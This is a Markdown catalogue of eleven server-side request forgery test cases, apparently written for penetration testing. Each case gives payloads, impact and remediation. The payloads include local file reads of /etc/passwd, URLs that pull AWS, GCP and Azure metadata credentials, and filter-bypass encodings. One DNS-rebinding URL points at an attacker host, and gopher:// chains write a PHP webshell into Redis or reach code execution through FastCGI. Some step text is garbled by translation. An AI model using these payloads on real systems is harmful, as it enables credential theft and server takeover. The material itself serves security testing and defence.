# SSRF Test Cases

> This file is a companion to `SKILL.md`, containing structured test cases organized by category and severity.

---

## Statistics

| Category | Count | Severity Range |
|------|------|-------------|
| A. SSRF Detection | 2 | HIGH - CRITICAL |
| B. Internal Network Scanning | 2 | HIGH - CRITICAL |
| C. Cloud Metadata | 2 | CRITICAL |
| D. Bypass Techniques | 3 | MEDIUM - HIGH |
| E. Advanced Exploitation | 2 | CRITICAL |
| **Total** | **11** | **MEDIUM - CRITICAL** |

---

## A. SSRF Detection / SSRF Detection

### TC-SSRF-001: Basic Loopback Address SSRF Detection

| Field | Value |
|------|-----|
| **ID** | TC-SSRF-001 |
| **Name** | Basic Loopback Address SSRF Detection |
| **Category** | A. SSRF Detection |
| **Severity** | HIGH |
| **Prerequisites** | Target application has parameters accepting URLs（such as `url=`、`path=`、`src=`） |
| **Test Steps** | 1. Identify URL inputparameter<br>2. Construct payload: `http://127.0.0.1:8080/admin`<br>3. Construct payload: `http://localhost/server-status`<br>4. Construct payload: `http://[::1]:80/`<br>5. Construct payload: `http://0.0.0.0:80/` |
| **Expected Results** | Application returns local service response content, proving internal address requests are possible |
| **Actual Impact** | Attacker can access local services, internal APIs, admin panels |
| **Remediation** | Validate target IP after DNS resolution, block RFC 1918/loopback/link-local addresses |

### TC-SSRF-002: file:// Protocol Local File Read

| Field | Value |
|------|-----|
| **ID** | TC-SSRF-002 |
| **Name** | file:// Protocol Local File Read |
| **Category** | A. SSRF Detection |
| **Severity** | CRITICAL |
| **Prerequisites** | Target application supports non-HTTP protocol URL requests |
| **Test Steps** | 1. Construct payload: `file:///etc/passwd`<br>2. Construct payload: `file:///proc/self/environ`<br>3. Construct payload: `file:///etc/hosts`<br>4. ObserveresponseiswhethercontainsfileContent |
| **Expected Results** | Application returns file contents from the local filesystem |
| **Actual Impact** | Sensitive file disclosure (password hashes, environment variables, configuration) |
| **Remediation** | Disable all non-HTTP/HTTPS protocols, use protocol whitelist for strict validation |

---

## B. Internal Network Scanning / Internal Network Scanning

### TC-SSRF-003: Internal Network Port Service Detection

| Field | Value |
|------|-----|
| **ID** | TC-SSRF-003 |
| **Name** | Internal Network Port Service Detection |
| **Category** | B. Internal Network Scanning |
| **Severity** | HIGH |
| **Prerequisites** | SSRF vulnerability confirmed, application can make HTTP requests |
| **Test Steps** | 1. Constructinternal network IP payload: `http://192.168.1.1:PORT/`<br>2. traversecommon port: 22, 80, 443, 3306, 5432, 6379, 8080, 9200, 27017<br>3. Use ffuf automated Scan: `ffuf -u "http://target/fetch?url=http://192.168.1.1:FUZZ/" -w ports.txt`<br>4. based onresponsestatuscode/when intervaldifferencejudgeportstatus |
| **Expected Results** | Identify open service ports and running software in the internal network |
| **Actual Impact** | Internal network topology exposed, providing target information for further attacks |
| **Remediation** | Deploy network isolation, restrict application outbound traffic to necessary services |

### TC-SSRF-004: Blind SSRF Port Scanning (Time-based)

| Field | Value |
|------|-----|
| **ID** | TC-SSRF-004 |
| **Name** | Blind SSRF Port Scanning (Time-based) |
| **Category** | B. Internal Network Scanning |
| **Severity** | CRITICAL |
| **Prerequisites** | SSRF vulnerability exists but response content is not visible (Blind SSRF) |
| **Test Steps** | 1. Measureopenportresponsewhen interval: `time curl "http://target/fetch?url=http://192.168.1.1:6379/"`<br>2. Measuredisableportresponsewhen interval: `time curl "http://target/fetch?url=http://192.168.1.1:9999/"`<br>3. Compareresponsewhen intervaldifference<br>4. Use OOB returntuneVerify: injection Collaborator/interactsh address |
| **Expected Results** | Measurable difference in response time between open and closed ports |
| **Actual Impact** | Even blind SSRF can map internal network service topology |
| **Remediation** | Unify error response time and messages, disable unnecessary URL request features |

---

## C. Cloud Metadata / Cloud Metadata

### TC-SSRF-005: AWS EC2 Instance Metadata Extraction

| Field | Value |
|------|-----|
| **ID** | TC-SSRF-005 |
| **Name** | AWS EC2 Instance Metadata Extraction |
| **Category** | C. Cloud Metadata |
| **Severity** | CRITICAL |
| **Prerequisites** | Target deployed on AWS EC2 instance using IMDSv1 (default) |
| **Test Steps** | 1. Construct payload: `http://169.254.169.254/latest/meta-data/`<br>2. Enumerate IAM role: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`<br>3. Obtaintemporarywhen credentials: `http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME`<br>4. Obtain user-data: `http://169.254.169.254/latest/user-data/` |
| **Expected Results** | Returns AWS IAM temporary credentials (AccessKeyID, SecretAccessKey, SessionToken) |
| **Actual Impact** | Attacker can take over cloud resources after obtaining AWS credentials (S3, EC2, Lambda, etc.) |
| **Remediation** | Enforce IMDSv2 (requires PUT token), deploy firewall rules to block access to 169.254.169.254 |

### TC-SSRF-006: GCP/Azure Instance Metadata Extraction

| Field | Value |
|------|-----|
| **ID** | TC-SSRF-006 |
| **Name** | GCP/Azure Instance Metadata Extraction |
| **Category** | C. Cloud Metadata |
| **Severity** | CRITICAL |
| **Prerequisites** | Target deployed on GCP or Azure instance |
| **Test Steps** | GCP:<br>1. `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`<br>2. If header injection is needed，Attemptthrough gopher:// or CRLF injectionadd `Metadata-Flavor: Google`<br><br>Azure:<br>1. `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/`<br>2. `http://169.254.169.254/metadata/instance?api-version=2021-02-01` |
| **Expected Results** | Returns cloud platform OAuth2 Token or instance identity information |
| **Actual Impact** | Attacker can move laterally to other cloud resources after obtaining cloud credentials |
| **Remediation** | GCP: limitationmetadata API access; Azure: enable Managed Identity least privilege |

---

## D. Bypass Techniques / Bypass Techniques

### TC-SSRF-007: IP Address Obfuscation Bypass (Hex/Decimal/Octal/IPv6)

| Field | Value |
|------|-----|
| **ID** | TC-SSRF-007 |
| **Name** | IP addresstransformationbypass |
| **Category** | D. Bypass Techniques |
| **Severity** | HIGH |
| **Prerequisites** | Target uses IP blacklist or regex to filter internal IP addresses |
| **Test Steps** | 1. hexadecimal: `http://0x7f000001:8080/`（127.0.0.1）<br>2. decimal: `http://2130706433:8080/`（127.0.0.1）<br>3. octal: `http://0177.0.0.1:8080/`（127.0.0.1）<br>4. IPv6: `http://[::1]:8080/`<br>5. all零: `http://0.0.0.0:8080/`<br>6. 混combine: `http://0x7f.0.0.1:8080/` |
| **Expected Results** | Transformed IP representation bypasses string-level filtering rules |
| **Actual Impact** | Bypass IP blacklist based on string matching |
| **Remediation** | Validate actual IP address after DNS resolution, not the original URL string |

### TC-SSRF-008: URL Parsing Discrepancy Bypass (@ Symbol / Encoding / Fragment)

| Field | Value |
|------|-----|
| **ID** | TC-SSRF-008 |
| **Name** | URL solveanalysisdifferencebypass |
| **Category** | D. Bypass Techniques |
| **Severity** | MEDIUM |
| **Prerequisites** | Target uses domain whitelist but URL parsing logic has discrepancies |
| **Test Steps** | 1. @ characternumberspoofing: `http://allowed.com@127.0.0.1:8080/admin`<br>2. URL encoding: `http://%31%32%37%2e%30%2e%30%2e%31/`<br>3. # 片segment: `http://169.254.169.254%23.allowed.com/`<br>4. 短format: `http://127.1:8080/`<br>5. 嵌setencoding: `http://127.0.0.1:8080/%2561dmin` |
| **Expected Results** | Application URL parser considers the request pointing to a legitimate domain, but actual request goes to internal address |
| **Actual Impact** | Bypass domain-based whitelist/blacklist validation |
| **Remediation** | Use mature URL parsing libraries (avoid custom implementations), validate actual target address after parsing |

### TC-SSRF-009: DNS Rebinding Bypass

| Field | Value |
|------|-----|
| **ID** | TC-SSRF-009 |
| **Name** | DNS Rebinding Bypass |
| **Category** | D. Bypass Techniques |
| **Severity** | HIGH |
| **Prerequisites** | Target validates IP during DNS resolution but does not re-validate when making actual requests |
| **Test Steps** | 1. Use DNS rebindingTools（rebinder.html / 1u.ms）Configureexchange替solveanalysisdomain name<br>2. No.atimesolveanalysisreturnpublic network IP（throughchecksum）<br>3. No.二timesolveanalysisreturninternal network IP（actualrequestObjective）<br>4. Construct payload: `http://rebind.attacker.com/latest/meta-data/iam/security-credentials/` |
| **Expected Results** | Application validation passes (public IP), but actual request goes to internal address |
| **Actual Impact** | Bypass IP validation during DNS resolution phase |
| **Remediation** | Validate IP when making requests (not just during DNS resolution), cache DNS results and reject TTL=0 resolutions |

---

## E. Advanced Exploitation

### TC-SSRF-010: gopher:// Protocol Smuggling to Redis Webshell Write

| Field | Value |
|------|-----|
| **ID** | TC-SSRF-010 |
| **Name** | gopher:// Protocol Smuggling to Redis Webshell Write |
| **Category** | E. Advanced Exploitation |
| **Severity** | CRITICAL |
| **Prerequisites** | SSRF supports gopher:// protocol; internal network Redis unauthorized access |
| **Test Steps** | 1. Use Gopherus Generate payload: `python3 gopherus.py --exploit redis`<br>2. ormanual Constructmultiplestepattack:<br> - `gopher://127.0.0.1:6379/_CONFIG SET dir /var/www/html`<br> - `gopher://127.0.0.1:6379/_CONFIG SET dbfilename shell.php`<br> - `gopher://127.0.0.1:6379/_SET x "<?php system($_GET[cmd]);?>"`<br> - `gopher://127.0.0.1:6379/_SAVE`<br>3. access `http://target/shell.php?cmd=id` |
| **Expected Results** | Write PHP Webshell to web directory, achieving remote code execution |
| **Actual Impact** | Escalate from SSRF to full RCE, completely controlling the target server |
| **Remediation** | Disable dangerous protocols like gopher://; set Redis password authentication and bind to 127.0.0.1 |

### TC-SSRF-011: SSRF to RCE - FastCGI Protocol Exploitation

| Field | Value |
|------|-----|
| **ID** | TC-SSRF-011 |
| **Name** | SSRF to RCE - FastCGI Protocol Exploitation |
| **Category** | E. Advanced Exploitation |
| **Severity** | CRITICAL |
| **Prerequisites** | SSRF supports gopher:// protocol; target runs PHP-FPM (FastCGI) |
| **Test Steps** | 1. Confirm PHP-FPM port（typically 9000）: `http://127.0.0.1:9000/`<br>2. Use Gopherus Generate FastCGI payload: `python3 gopherus.py --exploit fastcgi`<br>3. Construct payload set `PHP_VALUE` as `auto_prepend_file=php://input`<br>4. inrequestbodyininjection PHP code |
| **Expected Results** | Inject and execute PHP code via FastCGI protocol |
| **Actual Impact** | Achieve remote code execution without file writing |
| **Remediation** | Restrict PHP-FPM to listen only on Unix Socket, disable TCP listening; disable gopher:// protocol |
